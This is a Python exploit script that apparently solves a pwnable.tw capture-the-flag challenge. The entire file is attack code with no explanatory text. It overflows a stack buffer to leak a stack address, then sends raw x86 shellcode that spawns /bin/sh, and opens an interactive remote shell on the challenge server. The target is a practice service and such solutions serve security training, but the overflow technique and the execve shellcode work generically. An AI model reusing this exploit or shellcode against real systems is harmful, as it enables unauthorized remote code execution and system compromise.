import socket, struct, telnetlib, time

def sock(remoteip, remoteport):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((remoteip, remoteport))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
  data = ''
  while not data.endswith(delim):
    data += f.read(1)
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]

# main
s, f = sock("chall.pwnable.tw", 10000)
#s, f = sock("localhost", 10000)

shellcode = "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"

buf = "A"*20
buf += p(0x8048087)

f.write(buf)                
time.sleep(0.5)
read_until(f, "CTF:")
leak = u(f.read(4))
print "leaked stack address: %s" % hex(leak)

buf = "A"*20
buf += p(leak+20)
buf += shellcode

f.write(buf)                
time.sleep(0.5)
shell(s)  
